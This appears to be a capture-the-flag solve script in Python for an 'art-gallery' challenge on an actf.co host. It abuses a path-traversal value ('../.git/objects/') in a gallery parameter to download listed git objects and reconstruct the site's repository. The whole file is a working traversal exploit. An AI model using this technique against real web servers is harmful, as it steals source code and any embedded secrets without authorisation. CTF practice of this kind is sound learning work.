import requests
import os

files = ['56e8e4282f1e92b8f9e7183771f73777fb3b78ef', '713a4aba8af38c9507ced6ea41f602b105ca4101', '56e8e4282f1e92b8f9e7183771f73777fb3b78ef', '56449caeb7973b88f20d67b4c343cbb895aa6bc7', 'ff511529549e4a9376c897df27e001a909caa933', '3fbb557e5558aec56295c7f57e2d53f451d776cc', 'a5b3c03785736215a4baa6740b5e595eac72ecc1', '8aba39c0cc9e4e4835796ff01b98c86b8bc81b01', 'eb8070196c48bf973d69f04aa6befea57a79641c', '4c6c1591f1c1eac077042a3d5f37fa90c5bb4e0d', 'ab8ad5c7ab55aa2d66b9c4a9041f13e298a3c18f', '1486c662205e9b59ec3a3203f22421d9a538f241', '56e8e4282f1e92b8f9e7183771f73777fb3b78ef', '36781365cafae93b3cd8dbc5450e62c0eb57aeea', '1b9d0af53001a5c2a72c0c61d16d62403992800b', 'ff511529549e4a9376c897df27e001a909caa933']
files += ['5c1ff269bddd32dbe31722b499189947fbd8346a', '56e8e4282f1e92b8f9e7183771f73777fb3b78ef', 'ff511529549e4a9376c897df27e001a909caa933', '780f864715099a7612efae3a3cdbccde05a0adc4', '5c1ff269bddd32dbe31722b499189947fbd8346a']

url = 'https://art-gallery.web.actf.co/gallery?member=../.git/objects/'
for file in files:
    link = url + file[:2] + '/' + file[2:]
    os.makedirs('.git/objects/' + file[:2], exist_ok=True)
    r = requests.get(link, stream=True)
    with open('.git/objects/' + file[:2] + '/' + file[2:], "wb") as handle:
        for data in r.iter_content():
            handle.write(data)
